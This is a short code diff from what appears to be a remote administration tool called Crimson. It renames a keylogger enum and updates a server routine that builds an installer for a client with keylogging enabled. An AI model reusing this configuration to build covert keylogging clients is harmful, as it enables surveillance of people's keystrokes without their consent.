@@ -33,7 +33,7 @@ import com.subterranean_security.crimson.core.Common.Instance;
 import com.subterranean_security.crimson.core.platform.Platform;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
-import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
+import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
 import com.subterranean_security.crimson.core.proto.Misc.AuthMethod;
 import com.subterranean_security.crimson.core.proto.Misc.AuthType;
 import com.subterranean_security.crimson.core.proto.Misc.Outcome;
@@ -138,7 +138,7 @@ public final class Server {
 				.setPathWin(System.getProperty("user.home") + "\\Documents\\Crimson").setPathBsd("/")
 				.setPathLin("/home/dev/cr").setPathOsx(System.getProperty("user.home") + "/client").setPathSol("/")
 				.setReconnectPeriod(3000).setBuildNumber(Common.build).setAutostart(false).setKeylogger(true)
-				.setKeyloggerFlushMethod(FLUSH_METHOD.EVENT).setKeyloggerFlushValue(15).build();
+				.setKeyloggerFlushMethod(Trigger.EVENT).setKeyloggerFlushValue(15).build();
 		try {
 			// Generate installer
 			Generator g = new Generator();
